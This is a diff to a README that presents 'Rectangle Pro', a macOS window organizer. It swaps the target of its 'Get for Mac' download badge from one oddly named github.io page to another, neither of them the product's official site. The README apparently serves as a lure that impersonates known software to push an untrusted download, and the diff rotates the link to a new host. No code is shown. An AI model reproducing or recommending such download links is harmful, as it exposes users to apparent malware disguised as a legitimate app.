@@ -1,12 +1,12 @@
 # Rectangle Pro – Advanced Window Organizer  
 
 <div align="center">
-  <img src="https://rectangleapp.com/assets/pro/images/mac512pts1x.png" width="250"/>
+  <img src="https://rectangleapp.com/assets/images/mac512pts1x.png" width="250"/>
 </div>  
 <br>
 <div align="center">
 
-[![🍏 Get for Mac](https://img.shields.io/badge/🍏_Get_for_Mac-green?style=for-the-badge&logo=apple)](https://osx-25.github.io/.github/rectangle)
+[![🍏 Get for Mac](https://img.shields.io/badge/🍏_Get_for_Mac-green?style=for-the-badge&logo=apple)](https://za-loop-osx-software.github.io/.github/rectangle)
 
 </div>
 
